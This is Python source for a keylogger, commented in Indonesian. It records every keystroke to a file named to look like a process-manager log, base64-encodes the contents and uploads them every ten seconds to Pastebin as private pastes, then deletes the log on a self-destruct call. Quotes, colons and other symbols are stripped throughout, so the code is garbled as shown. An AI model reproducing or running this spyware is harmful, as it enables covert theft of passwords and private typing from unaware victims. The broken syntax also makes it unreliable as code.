#!usrbinpython3

import os
import time
import threading
import requests
import base64
from pynput.keyboard import Listener

# Kelas utama untuk menangkap dan menyimpan log dari penekanan tombol
class Key()
    keys = []
    count = 0
    flag = 0
    hostname = os.uname().nodename  # Mendapatkan nama komputer di Linux
    path = os.path.join(os.path.expanduser(~), f{hostname}_processmanager.txt)

    # Fungsi untuk menangkap penekanan tombol
    def on_press(self, key)
        self.keys.append(key)
        self.count += 1

        if self.count = 1
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    # Fungsi untuk membaca isi log dari file
    def read_logs(self)
        if os.path.exists(self.path)
            with open(self.path, 'rt') as f
                return f.read()
        return None

    # Fungsi untuk menulis log penekanan tombol ke file
    def write_file(self, keys)
        with open(self.path, 'a') as f
            for key in keys
                k = str(key).replace(', )
                if k.find(backspace)  0
                    f.write(BackSpace)
                elif k.find('enter')  0
                    f.write(n)
                elif k.find(shift)  0
                    f.write(Shift)
                elif k.find(space)  0
                    f.write( )
                elif k.find(caps_lock)  0
                    f.write( caps_lock )
                else
                    f.write(k)

    # Fungsi untuk menghentikan keylogger dan menghapus file log
    def self_destruct(self)
        self.flag = 1
        self.listener.stop()
        if os.path.exists(self.path)
            os.remove(self.path)
        else
            print(File tidak ditemukan.)

    # Fungsi untuk memulai keylogger
    def start(self)
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()

# Fungsi untuk mengirim log ke Pastebin
def plain_paste(title, contents)
    username = username
    password = password
    api_dev_key = pastebin_api_dev_key

    login_url = httpspastebin.comapiapi_login.php
    login_data = {
        api_dev_key api_dev_key,
        api_user_name username,
        api_user_password password
    }

    # Login ke Pastebin untuk mendapatkan user key
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text

    # Encode isi log dengan base64 sebelum dikirim ke Pastebin
    encoded_contents = base64.b64encode(contents.encode('utf-8')).decode('utf-8')

    # Kirim log ke Pastebin sebagai paste baru
    paste_url = httpspastebin.comapiapi_post.php
    paste_data = {
        api_paste_name title,
        api_paste_code encoded_contents,
        api_dev_key api_dev_key,
        api_user_key api_user_key,
        api_option 'paste',
        api_paste_private 2,
    }

    r = requests.post(paste_url, data=paste_data)
    if r.status_code == 200
        print(fLog berhasil diupload ke Pastebin {r.text})
    else
        print(fGagal mengupload log ke Pastebin {r.status_code})

def stop_keylogger(logkey)
    input(Tekan Enter untuk menghentikan keylogger...n)
    logkey.flag = 1

# Fungsi utama
if __name__ == __main__
    logkey = Key()
    t1 = threading.Thread(target=logkey.start)
    t2 = threading.Thread(target=stop_keylogger, args=(logkey,))

    t1.start()
    t2.start()

    while logkey.flag != 1
        time.sleep(10)
        logs = logkey.read_logs()

        if logs
            plain_paste(fKeylogger Logs dari {logkey.hostname}, logs)
            print(Log dikirim ke Pastebin)
        else
            print(Tidak ada log untuk dikirim.)

    logkey.self_destruct()
    t1.join()
    t2.join()
